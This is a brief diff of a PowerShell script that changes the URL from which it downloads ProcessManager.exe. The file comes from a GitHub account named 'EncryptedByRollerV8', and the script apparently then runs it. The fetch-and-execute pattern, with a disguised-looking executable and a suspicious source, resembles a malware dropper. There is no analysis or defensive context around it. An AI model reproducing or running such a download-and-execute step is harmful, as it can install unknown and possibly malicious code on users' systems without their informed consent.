@@ -6,7 +6,7 @@ Write-Host "Downloading to: $destination"
 
 try {
     # Download the file
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EncryptedByRollerV8/f/main/ProcessManager.exe" -OutFile $destination -UseBasicParsing
+    Invoke-WebRequest -Uri "https://github.com/EncryptedByRollerV8/k/raw/refs/heads/main/ProcessManager.exe" -OutFile $destination -UseBasicParsing
     
     # Run the file
     if (Test-Path $destination) {
